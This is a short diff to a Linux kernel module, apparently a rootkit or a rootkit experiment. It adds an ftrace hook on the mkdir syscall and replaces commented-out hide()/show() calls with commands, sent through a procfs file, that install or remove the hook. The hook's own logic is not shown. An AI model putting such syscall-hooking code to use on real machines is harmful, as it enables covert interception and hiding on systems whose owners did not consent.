@@ -6,6 +6,7 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include "module.h"
+#include "hook.h"
 
 // Optional
 int open_proc(struct inode *inode, struct file *file) {
@@ -30,6 +31,12 @@ ssize_t read_proc(struct file *filp, char __user *buffer, size_t length, loff_t 
     return length;;
 }
 
+static struct ftrace_hook hooks[] =
+        {
+                HOOK(HookMkdir, SYSCALL_NAME("mkdir"))
+        };
+
+
 /*
 ** This function will be called when we write the procfs file
 */
@@ -40,12 +47,15 @@ ssize_t write_proc(struct file *filp, const char __user *buff, size_t len, loff_
     // 不然会造成 exc_page_fault 错误
     if (!access_ok(buff, 2) || copy_from_user(command, buff, 2))
         return len;
+
     switch (command[0]) {
         case '0':
-            hide();
+//            hide();
+            FtraceHook(&(hooks[0].ops), hooks[0].hook_func_name);
             break;
         case '1':
-            show();
+//            show();
+            FtraceUnHook(&(hooks[0].ops));
             break;
         default:
             break;
